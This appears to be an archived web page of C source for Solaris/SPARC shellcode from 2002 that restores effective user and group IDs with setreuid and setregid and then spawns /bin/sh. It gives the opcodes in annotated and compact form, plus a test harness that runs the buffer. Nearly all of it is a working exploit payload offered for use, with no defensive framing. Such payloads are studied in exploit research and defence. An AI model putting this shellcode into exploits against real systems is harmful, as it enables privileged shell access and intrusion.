<html><head><title>Solaris/sparc - setreuid(geteuid()), setregid(getegid()), execve /bin/sh</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Solaris shellcode - setreuid(geteuid()), setregid(getegid()), execve /bin/sh
 *
 * Claes M. Nyberg 20020124
 * ,  
 */

#include 

static char solaris_code[] =
            
            /* geteuid() */
    &quot;\x82\x10\x20\x18&quot;   /* mov     24, %g1              */
    &quot;\x91\xd0\x20\x08&quot;   /* ta      0x8                  */
    &quot;\x90\x02\x60\x01&quot;   /* add     %o1, 1, %o0          */

            /* setreuid() */
    &quot;\x90\x22\x20\x01&quot;   /* sub     %o0, 1, %o0          */
    &quot;\x92\x10\x3f\xff&quot;   /* mov     -1, %o1              */
    &quot;\x82\x10\x20\xca&quot;   /* mov     202, %g1             */
    &quot;\x91\xd0\x20\x08&quot;   /* ta      0x8                  */

            /* getegid() */
    &quot;\x82\x10\x20\x2f&quot;   /* mov     47, %g1              */
    &quot;\x91\xd0\x20\x08&quot;   /* ta      0x8                  */
    &quot;\x90\x02\x60\x01&quot;   /* add     %o1, 1, %o0          */

            /* setregid() */
    &quot;\x90\x22\x20\x01&quot;   /* sub     %o0, 1, %o0          */
    &quot;\x92\x10\x3f\xff&quot;   /* mov     -1, %o1              */
    &quot;\x82\x10\x20\xcb&quot;   /* mov     203, %g1             */
    &quot;\x91\xd0\x20\x08&quot;   /* ta      0x8                  */

            /* execve(/bin/sh ..) */
    &quot;\x94\x1a\x80\x0a&quot;   /* xor     %o2, %o2, %o2        */
    &quot;\x21\x0b\xd8\x9a&quot;   /* sethi   %hi(0x2f626800), %l0 */
    &quot;\xa0\x14\x21\x6e&quot;   /* or      %l0, 0x16e, %l0      */
    &quot;\x23\x0b\xcb\xdc&quot;   /* sethi   %hi(0x2f2f7000), %l1 */
    &quot;\xa2\x14\x63\x68&quot;   /* or      %l1, 0x368, %l1      */
    &quot;\xd4\x23\xbf\xfc&quot;   /* st      %o2, [%sp - 4]       */
    &quot;\xe2\x23\xbf\xf8&quot;   /* st      %l1, [%sp - 8]       */
    &quot;\xe0\x23\xbf\xf4&quot;   /* st      %l0, [%sp - 12]      */
    &quot;\x90\x23\xa0\x0c&quot;   /* sub     %sp, 12, %o0         */
    &quot;\xd4\x23\xbf\xf0&quot;   /* st      %o2, [%sp - 16]      */
    &quot;\xd0\x23\xbf\xec&quot;   /* st      %o0, [%sp - 20]      */
    &quot;\x92\x23\xa0\x14&quot;   /* sub     %sp, 20, %o1         */
    &quot;\x82\x10\x20\x3b&quot;   /* mov     59, %g1              */
    &quot;\x91\xd0\x20\x08&quot;   /* ta      0x8                  */

            /* exit() */
    &quot;\x82\x10\x20\x01&quot;   /* mov     1, %g1               */
    &quot;\x91\xd0\x20\x08&quot;;  /* ta      0x8                  */


static char _solaris_code[] =
	&quot;\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22&quot;
	&quot;\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xca\x91\xd0\x20\x08&quot;
	&quot;\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22&quot;
	&quot;\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08&quot;
	&quot;\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b&quot;
	&quot;\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8&quot;
	&quot;\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23&quot;
	&quot;\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b\x91\xd0\x20\x08&quot;
	&quot;\x82\x10\x20\x01\x91\xd0\x20\x08&quot;;

int
main(void)
{
    void (*code)() = (void *)_solaris_code;
    printf(&quot;Shellcode length: %d\n&quot;, strlen(_solaris_code));
    code();
    return(1);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
